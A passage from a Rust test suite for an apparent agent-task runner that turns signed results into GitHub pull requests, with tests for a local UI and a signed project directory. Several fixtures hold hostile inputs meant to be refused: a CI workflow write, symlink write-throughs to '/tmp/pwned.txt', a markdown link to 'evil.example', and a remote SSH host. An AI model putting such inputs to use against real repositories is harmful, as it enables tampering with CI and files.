        p.fake.queue(Some(TOKEN)).post_task(&m.sign(&p.key).unwrap()).unwrap();
        let runner_key = crate::manifest::generate_key();
        let tar = if records.is_empty() { None } else { Some(crate::archive::to_bytes(records).unwrap()) };
        let r = crate::result::SignedResult::package(id, output.into(), 42, &m.output_schema, &runner_key, tar).unwrap();
        let q = p.fake.queue(Some(TOKEN));
        q.available().unwrap();
        q.submit(&r).unwrap();
        runner_key
    }

    fn trusted(p: &Project) -> crate::manifest::TrustedProjects {
        let mut t = crate::manifest::TrustedProjects::default();
        t.insert("a", p.key.verifying_key());
        t
    }

    fn issue_closed(p: &Project, n: usize) -> bool {
        p.fake.state.lock().unwrap().issues[n].closed
    }

    #[test]
    fn a_result_becomes_a_pull_request_automatically() {
        let p = project();
        let (remote, work) = repo("pr1", &[("src/a.txt", "old"), ("src/gone.txt", "bye"), ("README", "hi")]);
        let runner = finished(&p, "pr-1", "Fixed it.\n```\n@everyone [x](http://evil.example)\n```", &[file("src/a.txt", "new"), file("docs/new.md", "# new"), Record::Deleted { path: "src/gone.txt".into() }]);
        let rid = hex::encode(runner.verifying_key().to_bytes());
        let q = p.fake.queue(Some(TOKEN));
        let out = to_prs(&q, "org/proj", &trusted(&p), &Options::new(&work, "main")).unwrap();
        assert_eq!(out, [Outcome::PullRequest { task: "pr-1".into(), number: 500 }]);

        let branch = "toto/pr-1".to_string();
        let show = |path: &str| Command::new("git").current_dir(&remote).args(["show", &format!("{branch}:{path}")]).output().unwrap();
        assert_eq!(String::from_utf8_lossy(&show("src/a.txt").stdout), "new");
        assert_eq!(String::from_utf8_lossy(&show("docs/new.md").stdout), "# new");
        assert!(!show("src/gone.txt").status.success(), "deleted in the PR");
        assert_eq!(String::from_utf8_lossy(&show("README").stdout), "hi", "untouched files stay");
        assert_eq!(git(&remote, &["rev-parse", "main"]), git(&work, &["rev-parse", "origin/main"]), "main itself is untouched");

        let st = p.fake.state.lock().unwrap();
        let (_, head, base, title, body) = &st.pulls[0];
        assert_eq!((head.as_str(), base.as_str()), (branch.as_str(), "main"));
        assert!(title.contains("pr-1"));
        assert!(body.contains(&rid) && body.contains("42") && body.contains("verified"), "provenance: {body}");
        assert!(body.contains("````text"), "hostile output sits in a fence longer than any backtick run in it: {body}");
        drop(st);
        assert!(issue_closed(&p, 0));
        assert!(git(&work, &["status", "--porcelain"]).is_empty(), "the checkout is left clean");
        assert!(git(&work, &["branch", "--list", &branch]).is_empty(), "and without the local branch");

        assert!(to_prs(&q, "org/proj", &trusted(&p), &Options::new(&work, "main")).unwrap().is_empty(), "nothing is opened twice");
        assert_eq!(p.fake.state.lock().unwrap().pulls.len(), 1);
    }

    #[test]
    fn results_that_touch_ci_or_escape_the_repo_are_not_applied() {
        let p = project();
        let (remote, work) = repo("pr2", &[("README", "hi")]);
        finished(&p, "bad-ci", "x", &[file(".GitHub/workflows/evil.yml", "on: push"), file("ok.txt", "fine")]);
        finished(&p, "bad-lnk", "x", &[file("link/pwned.txt", "x")]);
        finished(&p, "bad-lnk2", "x", &[file("evil", "overwritten")]);
        let victim = work.parent().unwrap().join("victim.txt");
        std::fs::write(&victim, "untouched").unwrap();
        std::os::unix::fs::symlink("/tmp", work.join("link")).unwrap();
        std::os::unix::fs::symlink(&victim, work.join("evil")).unwrap();
        git(&work, &["add", "link", "evil"]);
        git(&work, &["commit", "-q", "-m", "link"]);
        git(&work, &["push", "-q", "origin", "main"]);
        let q = p.fake.queue(Some(TOKEN));
        let out = to_prs(&q, "org/proj", &trusted(&p), &Options::new(&work, "main")).unwrap();
        assert!(matches!(&out[0], Outcome::Refused { task, why } if task == "bad-ci" && why.contains(".GitHub/workflows")), "{out:?}");
        assert!(matches!(&out[1], Outcome::Refused { task, .. } if task == "bad-lnk"), "{out:?}");
        assert!(matches!(&out[2], Outcome::Refused { task, .. } if task == "bad-lnk2"), "{out:?}");
        assert_eq!(std::fs::read_to_string(&victim).unwrap(), "untouched", "a symlinked file is not written through");
        assert!(p.fake.state.lock().unwrap().pulls.is_empty());
        assert!(git(&remote, &["branch", "--list", "toto/*"]).is_empty(), "nothing was pushed");
        assert!(!Path::new("/tmp/pwned.txt").exists());
        assert!(git(&work, &["status", "--porcelain"]).is_empty());
        assert!(!issue_closed(&p, 0), "left open for a maintainer");
        let again = to_prs(&q, "org/proj", &trusted(&p), &Options::new(&work, "main")).unwrap();
        assert!(again.iter().all(|o| matches!(o, Outcome::AlreadyHandled(_))), "refusals are remembered, not repeated: {again:?}");
        let comments = p.fake.state.lock().unwrap().issues[0].comments.len();
        assert_eq!(comments, 2, "the result and one skip note");
    }

    #[test]
    fn text_only_unchanged_and_capped_results() {
        let p = project();
        let (_, work) = repo("pr3", &[("a.txt", "same")]);
        finished(&p, "t-text", "just an answer", &[]);
        finished(&p, "t-same", "no-op", &[file("a.txt", "same")]);
        finished(&p, "t-one", "one", &[file("one.txt", "1")]);
        finished(&p, "t-two", "two", &[file("two.txt", "2")]);
        let q = p.fake.queue(Some(TOKEN));
        let mut o = Options::new(&work, "main");
        o.max_open = 1;
        let out = to_prs(&q, "org/proj", &trusted(&p), &o).unwrap();
        assert_eq!(out[0], Outcome::TextOnly("t-text".into()));
        assert_eq!(out[1], Outcome::NoChange("t-same".into()));
        assert!(matches!(out[2], Outcome::PullRequest { .. }), "{out:?}");
        assert_eq!(out[3], Outcome::Deferred("t-two".into()), "the cap stops a flood");
        assert!(issue_closed(&p, 0) && issue_closed(&p, 1) && issue_closed(&p, 2) && !issue_closed(&p, 3));
        // The text answer was posted as a comment, inside a fence.
        let st = p.fake.state.lock().unwrap();
        assert!(st.issues[0].comments.iter().any(|c| c.1.contains("just an answer") && c.1.contains("```text")));
    }

    #[test]
    fn forged_tasks_and_untrusted_projects_are_ignored() {
        let p = project();
        let (_, work) = repo("pr4", &[("a.txt", "x")]);
        // an issue whose task was signed by somebody else, with a perfectly valid result under it
        let imposter = crate::manifest::generate_key();
        let mut m = super::task("forged", "a", 10, &imposter);
        m.output_schema.max_bytes = 100;
        p.fake.queue(Some(TOKEN)).post_task(&m.sign(&imposter).unwrap()).unwrap();
        let q = p.fake.queue(Some(TOKEN));
        q.available().unwrap();
        let r = crate::result::SignedResult::package("forged", "x".into(), 1, &m.output_schema, &crate::manifest::generate_key(), None).unwrap();
        q.submit(&r).unwrap();
        let out = to_prs(&q, "org/proj", &trusted(&p), &Options::new(&work, "main")).unwrap();
        assert!(out.is_empty(), "{out:?}");
        assert!(!issue_closed(&p, 0));
    }

    #[test]
    fn a_dirty_checkout_is_not_touched() {
        let p = project();
        let (_, work) = repo("pr5", &[("a.txt", "x")]);
        finished(&p, "dirty", "x", &[file("b.txt", "y")]);
        std::fs::write(work.join("a.txt"), "local edit").unwrap();
        let q = p.fake.queue(Some(TOKEN));
        let err = to_prs(&q, "org/proj", &trusted(&p), &Options::new(&work, "main")).unwrap_err();
        assert!(err.to_string().contains("uncommitted"), "{err}");
        assert_eq!(std::fs::read_to_string(work.join("a.txt")).unwrap(), "local edit");
        assert!(!issue_closed(&p, 0));
    }

    // ----------------------------------------------------------------- the local UI

    /// `toto ui` on an ephemeral port: the token gate, the overview, policy edits, and the add,
    /// check and remove flows through the same previews the CLI uses, against the fake GitHub.
    #[tokio::test(flavor = "multi_thread")]
    async fn the_local_ui_shows_and_changes_what_the_cli_does() {
        use crate::ui::{router, UiState, TOKEN_HEADER};
        let p = project();
        let have_docker = super::proxy_container::docker_has("alpine");
        if have_docker {
            let _ = std::process::Command::new("docker").args(["tag", "alpine", "localhost/env:dev"]).status();
        }
        publish(&p, &devcontainer_json(&p.key, "").replace("ghcr.io/acme/env:1.0", "localhost/env:dev"), &[("config.yaml", &agent_config("")), ("skills/triage/SKILL.md", "---\nname: triage\n---\n")]);
        // The directory lives on the same fake GitHub, signed by a key the config trusts.
        let maintainers = crate::manifest::generate_key();
        let gh = p.fake.queue(None);
        let f0 = projects::fetch(&gh).unwrap();
        let mut d = crate::directory::Directory::default();
        d.upsert(crate::directory::entry_from("org/proj", &f0, "2026-10-06").unwrap());
        p.fake.state.lock().unwrap().files.push((crate::directory::DEFAULT_PATH.into(), serde_json::to_vec(&d.sign(&maintainers, "2026-10-06").unwrap()).unwrap()));

        let f = super::fixture("ui");
        let mut cfg = Config::starter(&f.dir);
        cfg.directory = crate::config::DirectoryConfig { repo: "org/proj".into(), path: crate::directory::DEFAULT_PATH.into(), public_key: hex::encode(maintainers.verifying_key().to_bytes()), api_url: p.fake.api() };
        std::fs::create_dir_all(&cfg.state_dir).unwrap();
        crate::audit::AuditLog::new(cfg.state_dir.join("audit.jsonl")).append(&crate::audit::AuditEntry { ts: chrono::Local::now(), task_id: "t1".into(), project_id: "acme".into(), outcome: "submitted".into(), detail: "x".into(), tokens: 1234 }).unwrap();
        let path = f.dir.join("config.json");
        cfg.save(&path).unwrap();
        let token = crate::ui::new_token();
        let state = std::sync::Arc::new(UiState::new(path.clone(), token.clone()).unwrap());
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        tokio::spawn(axum::serve(listener, router(state)).into_future());

        let agent: ureq::Agent = ureq::Agent::config_builder().http_status_as_error(false).build().into();
        let call = |method: &str, path: &str, tok: Option<String>, body: Option<serde_json::Value>| {
            let (agent, url) = (agent.clone(), format!("{base}{path}"));
            let method = method.to_string();
            async move {
                tokio::task::spawn_blocking(move || {
                    let mut req = match method.as_str() {
                        "GET" => agent.get(&url).force_send_body(),
                        "PUT" => agent.put(&url),
                        _ => agent.post(&url),
                    };
                    if let Some(t) = tok {
                        req = req.header(TOKEN_HEADER, &t);
                    }
                    let mut resp = match body {
                        Some(b) => req.header("content-type", "application/json").send(b.to_string().as_bytes()).unwrap(),
                        None => req.send_empty().unwrap(),
                    };
                    let status = resp.status().as_u16();
                    let text = resp.body_mut().read_to_string().unwrap_or_default();
                    (status, serde_json::from_str::<serde_json::Value>(&text).unwrap_or(serde_json::Value::Null))
                })
                .await
                .unwrap()
            }
        };
        let t = Some(token.clone());

        // The page itself is served; the API is not without the token.
        let (st, _) = call("GET", "/", None, None).await;
        assert_eq!(st, 200);
        assert_eq!(call("GET", "/api/overview", None, None).await.0, 401);
        assert_eq!(call("GET", "/api/overview", Some("wrong".into()), None).await.0, 401);
        let (st, ov) = call("GET", "/api/overview", t.clone(), None).await;
        assert_eq!(st, 200, "{ov}");
        assert_eq!((ov["used_today"].as_u64(), ov["projects"].as_u64(), ov["reserve_pct"].as_u64()), (Some(1234), Some(0), Some(20)));
        assert_eq!(ov["audit"][0]["task_id"], "t1");
        assert!(ov["status"].is_null(), "no daemon has run");

        // Policy: edits are validated and saved.
        let (st, _) = call("PUT", "/api/policy", t.clone(), Some(serde_json::json!({"daily_token_cap": 5000, "reserve_pct": 101, "quiet_hours": null, "project_shares": {}}))).await;
        assert_eq!(st, 400);
        let (st, pol) = call("PUT", "/api/policy", t.clone(), Some(serde_json::json!({"daily_token_cap": 5000, "reserve_pct": 30, "quiet_hours": [22, 7], "project_shares": {}}))).await;
        assert_eq!((st, pol["reserve_pct"].as_u64()), (200, Some(30)));
        let saved = Config::load(&path).unwrap();
        assert_eq!((saved.policy.daily_token_cap, saved.policy.reserve_pct, saved.policy.quiet_hours), (5000, 30, Some((22, 7))));

        if !have_docker {
            eprintln!("skipping the add/check/remove flow: needs docker and alpine");
            return;
        }
        // Add by directory name: a preview first, nothing saved yet.
        let (st, pv) = call("POST", "/api/projects/preview", t.clone(), Some(serde_json::json!({"arg": "acme", "share": 2}))).await;
        assert_eq!(st, 200, "{pv}");
        assert_eq!((pv["repo"].as_str(), pv["listed"].as_bool(), pv["approval"]["harness"].as_str()), (Some("org/proj"), Some(true), Some("claude-sdk")));
        assert!(pv["approval"]["skills"].as_array().unwrap().iter().any(|s| s == "triage"));
        assert!(Config::load(&path).unwrap().projects.is_empty(), "a preview changes nothing");
        let pending = pv["pending"].as_str().unwrap().to_string();
        let (st, ap) = call("POST", &format!("/api/pending/{pending}/approve"), t.clone(), None).await;
        assert_eq!(st, 200, "{ap}");
        assert!(ap["message"].as_str().unwrap().contains("added `acme`"));
        assert_eq!(call("POST", &format!("/api/pending/{pending}/approve"), t.clone(), None).await.0, 404, "a pending preview applies once");
        let saved = Config::load(&path).unwrap();
        assert_eq!((saved.projects.len(), saved.policy.project_shares["acme"], saved.environments["acme"].agent.skills.as_slice()), (1, 2, &["triage".to_string()][..]));

        // The list and the detail show what was approved.
        let (_, list) = call("GET", "/api/projects", t.clone(), None).await;
        assert_eq!((list[0]["id"].as_str(), list[0]["share"].as_u64(), list[0]["approval"]["image"].as_str()), (Some("acme"), Some(2), Some("localhost/env:dev")));
        let (_, det) = call("GET", "/api/projects/acme", t.clone(), None).await;
        assert!(det["config_yaml"].as_str().unwrap().contains("claude-sdk") && det["files"].as_array().unwrap().len() == 2, "{det}");
        assert_eq!(call("GET", "/api/projects/nope", t.clone(), None).await.0, 404);

        // Check: nothing changed, then the agent changes and the diff is shown and approved.
        let (st, ck) = call("POST", "/api/projects/acme/check", t.clone(), None).await;
        assert_eq!((st, ck["state"].as_str()), (200, Some("up_to_date")), "{ck}");
        publish(&p, &devcontainer_json(&p.key, "").replace("ghcr.io/acme/env:1.0", "localhost/env:dev"), &[("config.yaml", &agent_config("").replace("Fix docs.", "Fix docs carefully."))]);
        let (st, ck) = call("POST", "/api/projects/acme/check", t.clone(), None).await;
        assert_eq!((st, ck["state"].as_str()), (200, Some("changed")), "{ck}");
        assert!(ck["lines"].as_array().unwrap().iter().any(|l| l.as_str().unwrap().contains("agent")), "{ck}");
        let pending = ck["pending"].as_str().unwrap().to_string();
        assert_eq!(call("POST", &format!("/api/pending/{pending}/approve"), t.clone(), None).await.0, 200);
        assert!(Config::load(&path).unwrap().environments["acme"].agent.skills.is_empty(), "the new version has no skill");

        // Pause and resume: the marker, and the status the page shows at once.
        let (st, paused) = call("POST", "/api/pause", t.clone(), None).await;
        assert_eq!((st, paused["user_paused"].as_bool(), paused["state"].as_str()), (200, Some(true), Some("paused")), "{paused}");
        assert!(crate::control::is_paused(&Config::load(&path).unwrap().state_dir));
        let (_, resumed) = call("POST", "/api/resume", t.clone(), None).await;
        assert_eq!(resumed["user_paused"].as_bool(), Some(false));

        // The event stream: refused without the token; with it, the first event is the status.
        assert_eq!(call("GET", "/api/events", None, None).await.0, 401);
        let (sbase, stoken) = (base.clone(), token.clone());
        let first = tokio::task::spawn_blocking(move || {
            use std::io::{BufRead, Read, Write};
            let addr = sbase.trim_start_matches("http://").to_string();
            let mut c = std::net::TcpStream::connect(&addr).unwrap();
            c.set_read_timeout(Some(std::time::Duration::from_secs(5))).unwrap();
            write!(c, "GET /api/events?token={stoken} HTTP/1.1\r\nhost: x\r\naccept: text/event-stream\r\n\r\n").unwrap();
            let mut r = std::io::BufReader::new(c.try_clone().unwrap());
            let mut line = String::new();
            r.read_line(&mut line).unwrap();
            assert!(line.contains("200"), "{line}");
            let mut out = String::new();
            let mut buf = [0u8; 1024];
            while !out.contains("\n\n") {
                let n = r.read(&mut buf).unwrap_or(0);
                if n == 0 { break; }
                out.push_str(&String::from_utf8_lossy(&buf[..n]));
            }
            out
        })
        .await
        .unwrap();
        assert!(first.contains("event: status") && first.contains("\"user_paused\":false"), "{first}");

        // Remove.
        assert_eq!(call("POST", "/api/projects/acme/remove", t.clone(), None).await.0, 200);
        assert!(Config::load(&path).unwrap().projects.is_empty());
        assert_eq!(call("POST", "/api/projects/acme/remove", t.clone(), None).await.0, 400);
    }

    // ----------------------------------------------------------------- the signed directory

    #[test]
    fn the_directory_is_signed_verified_and_resolves_names() {
        use crate::directory::{self, Directory, Entry};
        let p = project();
        publish(&p, &devcontainer_json(&p.key, ""), &[("config.yaml", &agent_config(""))]);
        let gh = p.fake.queue(None);
        let f = projects::fetch(&gh).unwrap();
        let entry = directory::entry_from("org/proj", &f, "2026-10-06").unwrap();
        assert_eq!((entry.id.as_str(), entry.repo.as_str(), entry.harness.as_str(), entry.needs_network, entry.kinds.as_slice()), ("acme", "org/proj", "claude-sdk", false, &["summarise".to_string()][..]));
        assert_eq!(entry.public_key, f.devcontainer.toto.public_key);
        assert!(directory::entry_from("not-a-repo", &f, "2026-10-06").is_err());

        let maintainers = crate::manifest::generate_key();
        let mut d = Directory::default();
        assert!(!d.upsert(entry.clone()));
        assert!(d.upsert(Entry { description: "refreshed".into(), ..entry.clone() }), "same id replaces");
        assert_eq!(d.projects.len(), 1);
        let signed = serde_json::to_vec(&d.sign(&maintainers, "2026-10-06").unwrap()).unwrap();
        p.fake.state.lock().unwrap().files.push((directory::DEFAULT_PATH.into(), signed.clone()));

        // A runner fetches and verifies it with the maintainers' key, and nothing else.
        let got = directory::fetch(&gh, directory::DEFAULT_PATH, &maintainers.verifying_key()).unwrap();
        assert_eq!((got.updated.as_str(), got.projects[0].description.as_str()), ("2026-10-06", "refreshed"));
        assert_eq!(got.resolve("acme").map(|e| e.repo.as_str()), Some("org/proj"));
        assert_eq!(got.resolve("ORG/proj").map(|e| e.id.as_str()), Some("acme"), "repositories match case-insensitively");
        assert!(got.resolve("nope").is_none() && got.resolve("x/y").is_none());
        let other = crate::manifest::generate_key();
        let e = directory::fetch(&gh, directory::DEFAULT_PATH, &other.verifying_key()).unwrap_err().to_string();
        assert!(e.contains("does not verify"), "{e}");
        let mut tampered: crate::dsse::Envelope = serde_json::from_slice(&signed).unwrap();
        let mut d2 = d.clone();
        d2.projects[0].public_key = hex::encode(other.verifying_key().to_bytes());
        tampered.payload = { use base64::Engine; base64::engine::general_purpose::STANDARD.encode(serde_json::to_vec_pretty(&d2).unwrap()) };
        assert!(Directory::open(&serde_json::to_vec(&tampered).unwrap(), &maintainers.verifying_key()).is_err(), "an edited payload fails the signature");
        assert!(directory::fetch(&gh, "directory/missing.json", &maintainers.verifying_key()).unwrap_err().to_string().contains("no directory"));

        // The key check: the repository must still publish the key the directory listed.
        assert!(directory::check_key(&entry, &f.devcontainer.toto).is_ok());
        publish(&p, &devcontainer_json(&other, ""), &[("config.yaml", &agent_config(""))]);
        let swapped = projects::fetch(&gh).unwrap();
        let e = directory::check_key(&entry, &swapped.devcontainer.toto).unwrap_err().to_string();
        assert!(e.contains("now publishes") && e.contains("refusing"), "{e}");
        let renamed = crate::devcontainer::Toto { id: "other-id".into(), ..f.devcontainer.toto.clone() };
        assert!(directory::check_key(&entry, &renamed).unwrap_err().to_string().contains("calls itself"));

        // What a maintainer cannot sign.
        for (what, bad) in [
            ("duplicate id", Directory { projects: vec![entry.clone(), entry.clone()], ..Default::default() }),
            ("bad repo", Directory { projects: vec![Entry { repo: "org".into(), ..entry.clone() }], ..Default::default() }),
            ("bad key", Directory { projects: vec![Entry { public_key: "abcd".into(), ..entry.clone() }], ..Default::default() }),
            ("no kinds", Directory { projects: vec![Entry { kinds: vec![], ..entry.clone() }], ..Default::default() }),
            ("bad id", Directory { projects: vec![Entry { id: "Acme!".into(), ..entry.clone() }], ..Default::default() }),
            ("version", Directory { version: 2, ..Default::default() }),
        ] {
            assert!(bad.sign(&maintainers, "2026-10-06").is_err(), "{what} must be refused");
        }
        assert!(d.remove("acme") && !d.remove("acme") && d.projects.is_empty());
        let text = directory::describe(&got).join("\n");
        assert!(text.contains("acme") && text.contains("org/proj") && text.contains("claude-sdk"), "{text}");
        // The built-in default key parses, so a fresh config can read the real directory.
        assert!(directory::parse_key(directory::DEFAULT_KEY).is_ok());
        assert!(directory::parse_key("zz").is_err());
    }

    // ----------------------------------------------------------------- contributors choose projects

    use crate::config::{Config, QueueEndpoint};
    use crate::projects::{self, AddOptions, Approval, RepoFiles};

    fn devcontainer_json(key: &ed25519_dalek::SigningKey, extra: &str) -> String {
        format!(
            "{{\n  // comments are fine\n  \"name\": \"acme\",\n  \"image\": \"ghcr.io/acme/env:1.0\",\n  \"customizations\": {{\"toto\": {{\"id\": \"acme\", \"name\": \"Acme Docs\", \"description\": \"Keeps docs current.\", \"public_key\": \"{}\", \"kinds\": [\"summarise\"]}}}}{extra}\n}}",
            hex::encode(key.verifying_key().to_bytes())
        )
    }

    fn agent_config(extra: &str) -> String {
        format!("spec_version: 1\nname: acme\nexecutor:\n  type: omnigent\n  config: {{harness: claude-sdk}}\n  model: claude-x\nprompt: Fix docs.\n{extra}\n")
    }

    /// Puts a project's files on the fake GitHub.
    fn publish(p: &Project, devcontainer: &str, agent: &[(&str, &str)]) {
        let mut st = p.fake.state.lock().unwrap();
        st.files.retain(|f| !f.0.starts_with(".devcontainer") && !f.0.starts_with(".toto"));
        st.files.push((".devcontainer/devcontainer.json".into(), devcontainer.as_bytes().to_vec()));
        for (path, text) in agent {
            st.files.push((format!(".toto/agent/{path}"), text.as_bytes().to_vec()));
        }
        st.head = "c0ffee0123456789abcdef".into();
    }

    fn fake_info() -> crate::image::ImageInfo {
        crate::image::ImageInfo { id: "sha256:0001".into(), digest: Some(format!("sha256:{}", "ab".repeat(32))), user: String::new(), env: vec![], entrypoint: vec![], cmd: vec![], size: 1, history: vec!["FROM x".into()] }
    }

    fn contributor(name: &str) -> Config {
        Config::starter(&super::fixture(name).dir)
    }

    #[test]
    fn a_project_is_read_from_its_devcontainer_and_agent_directory() {
        let p = project();
        publish(&p, &devcontainer_json(&p.key, ", \"runArgs\": [\"--privileged\"], \"postCreateCommand\": \"npm ci\""), &[("config.yaml", &agent_config("tools:\n  docs: {type: mcp, command: python, args: [\"-m\", \"docs\"]}")), ("skills/triage/SKILL.md", "---\nname: triage\n---\n")]);
        let gh = p.fake.queue(None);
        assert_eq!(gh.head_commit().unwrap().as_deref(), Some("c0ffee0123456789abcdef"));
        let f = projects::fetch(&gh).unwrap();
        assert_eq!(f.commit.as_deref(), Some("c0ffee0123456789abcdef"));
        assert_eq!(f.devcontainer.image.as_deref(), Some("ghcr.io/acme/env:1.0"));
        assert_eq!(f.devcontainer.toto.id, "acme");
        assert!(f.devcontainer.notes.iter().any(|n| n.contains("runArgs")) && f.devcontainer.notes.iter().any(|n| n.contains("postCreateCommand") && n.contains("never runs")), "{:?}", f.devcontainer.notes);
        assert_eq!(f.agent_files.keys().cloned().collect::<Vec<_>>(), ["config.yaml", "skills/triage/SKILL.md"]);
        let a = Approval::new("ghcr.io/acme/env:1.0", fake_info(), &f.agent_files, f.commit.clone(), false).unwrap();
        assert_eq!(a.agent.harness, "claude-sdk");
        assert_eq!(a.agent.mcp, [("docs".to_string(), "python -m docs".to_string())]);
        assert_eq!(a.agent.skills, ["triage"]);
        assert!(!a.agent.needs_network);
        assert_eq!(a.pinned(), format!("ghcr.io/acme/env@sha256:{}", "ab".repeat(32)));
        let text = a.describe().join("\n");
        assert!(text.contains("harness     claude-sdk") && text.contains("Anthropic") && text.contains("c0ffee0123456789abcdef"), "{text}");
        // The stored tar round-trips to the same files.
        assert_eq!(crate::agent::unpack(&a.agent_tar_bytes().unwrap()).unwrap(), f.agent_files);
    }

    #[test]
    fn adding_a_project_approves_exactly_what_was_shown() {
        let p = project();
        publish(&p, &devcontainer_json(&p.key, ""), &[("config.yaml", &agent_config("os_env:\n  type: caller_process\n  cwd: \".\"\n  sandbox: {type: linux_bwrap, allow_network: true, egress_rules: [\"GET api.acme.example/**\"]}"))]);
        let f = projects::fetch(&p.fake.queue(None)).unwrap();
        let a = Approval::new("ghcr.io/acme/env:1.0", fake_info(), &f.agent_files, f.commit.clone(), false).unwrap();
        assert!(a.agent.needs_network && a.agent.needs_nested_sandbox());

        let mut cfg = contributor("proj-add");
        let notes = projects::add(&mut cfg, "org/proj", &f.devcontainer, a.clone(), &AddOptions { share: 3, token_file: None }).unwrap();
        assert_eq!(cfg.projects["acme"], f.devcontainer.toto.public_key);
        assert_eq!((cfg.policy.project_shares["acme"], cfg.sources["acme"].as_str()), (3, "org/proj"));
        assert_eq!(cfg.policy.allowed_kinds, ["summarise"]);
        assert!(matches!(&cfg.queues[..], [QueueEndpoint::Github { repo, .. }] if repo == "org/proj"));
        assert_eq!(cfg.environments["acme"], a);
        assert!(notes.iter().any(|n| n.contains("net-setup")) && notes.iter().any(|n| n.contains("nested_userns")) && notes.iter().any(|n| n.contains("no GitHub token")), "the contributor is told what their setup lacks: {notes:?}");

        // A task from the project is admitted by policy; the sandbox gets the approval's image and network need.
        let now = chrono::Local::now();
        let mut t = super::task("acme-1", "acme", 10, &p.key);
        t.tool_requirements = vec!["omnigent".into()];
        assert!(cfg.policy.admit(&t, 0, now).is_ok(), "{:?}", cfg.policy.admit(&t, 0, now));
        let mut sb = crate::sandbox::DockerSandbox::new();
        sb.environments.insert("acme".into(), crate::sandbox::Environment { image: a.pinned(), network: a.agent.needs_network });
        assert!(sb.run_args("t", sb.environment_for("acme").unwrap(), &Default::default()).unwrap_err().to_string().contains("network"), "needs the fence");

        // Adding again changes nothing; a different key is refused until removed.
        projects::add(&mut cfg, "org/proj", &f.devcontainer, a.clone(), &AddOptions { share: 3, token_file: Some("/gh.token".into()) }).unwrap();
        assert_eq!((cfg.queues.len(), cfg.policy.allowed_kinds.len()), (1, 1));
        let other = crate::manifest::generate_key();
        publish(&p, &devcontainer_json(&other, ""), &[("config.yaml", &agent_config(""))]);
        let f2 = projects::fetch(&p.fake.queue(None)).unwrap();
        let e = projects::add(&mut cfg, "org/proj", &f2.devcontainer, a.clone(), &AddOptions { share: 1, token_file: None }).unwrap_err().to_string();
        assert!(e.contains("different key"), "{e}");
        assert_eq!(cfg.projects["acme"], f.devcontainer.toto.public_key);
        projects::remove(&mut cfg, "acme").unwrap();
        assert!(cfg.projects.is_empty() && cfg.environments.is_empty() && cfg.queues.is_empty());
        assert!(projects::remove(&mut cfg, "acme").is_err());
    }

    #[test]
    fn a_harness_the_runner_cannot_serve_is_noted_at_approval() {
        let p = project();
        publish(&p, &devcontainer_json(&p.key, ""), &[("config.yaml", &agent_config("").replace("claude-sdk", "codex"))]);
        let f = projects::fetch(&p.fake.queue(None)).unwrap();
        let a = Approval::new("ghcr.io/acme/env:1.0", fake_info(), &f.agent_files, None, false).unwrap();
        let mut cfg = contributor("proj-harness");
        let notes = projects::add(&mut cfg, "org/proj", &f.devcontainer, a, &AddOptions { share: 1, token_file: None }).unwrap();
        assert!(notes.iter().any(|n| n.contains("codex") && n.contains("OpenAi")), "{notes:?}");
    }

    #[test]
    fn bad_projects_are_refused_with_the_reason() {
        let p = project();
        // no devcontainer at all
        assert!(projects::fetch(&p.fake.queue(None)).unwrap_err().to_string().contains("no .devcontainer"));
        // no agent directory
        publish(&p, &devcontainer_json(&p.key, ""), &[]);
        assert!(projects::fetch(&p.fake.queue(None)).unwrap_err().to_string().contains("no agent directory"));
        // agent configs toto cannot run
        for (what, cfg) in [
            ("no harness", "spec_version: 1\nexecutor: {type: omnigent}\n".to_string()),
            ("unknown harness", agent_config("").replace("claude-sdk", "mystery")),
            ("remote os_env", agent_config("os_env: {type: ssh, host: evil.example}")),
            ("bad rule", agent_config("os_env:\n  sandbox: {type: linux_bwrap, allow_network: true, egress_rules: [\"not a rule\"]}")),
            ("not yaml", "{{{".into()),
        ] {
            publish(&p, &devcontainer_json(&p.key, ""), &[("config.yaml", &cfg)]);
            let f = projects::fetch(&p.fake.queue(None)).unwrap();
            assert!(Approval::new("ghcr.io/acme/env:1.0", fake_info(), &f.agent_files, None, false).is_err(), "{what} should be refused");
        }
        // devcontainer problems
        for (what, dc) in [
            ("no toto", "{\"image\": \"ghcr.io/a/b:1\"}".to_string()),
            ("bad id", devcontainer_json(&p.key, "").replace("\"id\": \"acme\"", "\"id\": \"Acme Corp!\"")),
            ("bad key", devcontainer_json(&p.key, "").replace(&hex::encode(p.key.verifying_key().to_bytes()), "abcd")),
            ("no kinds", devcontainer_json(&p.key, "").replace("[\"summarise\"]", "[]")),
            ("unqualified image", devcontainer_json(&p.key, "").replace("ghcr.io/acme/env:1.0", "node:20")),
            ("nothing to run", devcontainer_json(&p.key, "").replace("\"image\": \"ghcr.io/acme/env:1.0\",", "")),
        ] {
            publish(&p, &dc, &[("config.yaml", &agent_config(""))]);
            assert!(projects::fetch(&p.fake.queue(None)).is_err(), "{what} should be refused");
        }
    }

    #[test]
    fn removing_a_project_keeps_a_shared_queue_for_the_others() {
        let p = project();
        publish(&p, &devcontainer_json(&p.key, ""), &[("config.yaml", &agent_config(""))]);
        let f1 = projects::fetch(&p.fake.queue(None)).unwrap();
        publish(&p, &devcontainer_json(&p.key, "").replace("\"id\": \"acme\"", "\"id\": \"acme-two\""), &[("config.yaml", &agent_config(""))]);
        let f2 = projects::fetch(&p.fake.queue(None)).unwrap();
        let mut cfg = contributor("proj-rm");
        let a = |f: &projects::Fetched| Approval::new("ghcr.io/acme/env:1.0", fake_info(), &f.agent_files, None, false).unwrap();
        projects::add(&mut cfg, "org/proj", &f1.devcontainer, a(&f1), &AddOptions { share: 1, token_file: None }).unwrap();
        projects::add(&mut cfg, "org/proj", &f2.devcontainer, a(&f2), &AddOptions { share: 1, token_file: None }).unwrap();
        assert_eq!(projects::list(&cfg).len(), 2);
        projects::remove(&mut cfg, "acme").unwrap();
        assert_eq!(cfg.queues.len(), 1, "acme-two still reads that repository");
        projects::remove(&mut cfg, "acme-two").unwrap();
        assert!(cfg.queues.is_empty() && projects::list(&cfg).is_empty());
    }
}

mod relay {
    use crate::relay::{RelayLink, SCRIPT};
    use std::io::{Read, Write};
    use std::os::unix::net::UnixListener;

    /// The script and the runner side, on the host with no container: a unix echo server stands
    /// in for the proxy; several loopback connections at once each get their own bytes back.
    #[test]
    fn the_relay_multiplexes_loopback_connections_over_the_exec_stream() {
        if std::process::Command::new("python3").arg("--version").output().is_err() {
            eprintln!("skipping: needs python3");
            return;
        }
        let f = super::fixture("relay");
        let script = f.dir.join("toto-relay.py");
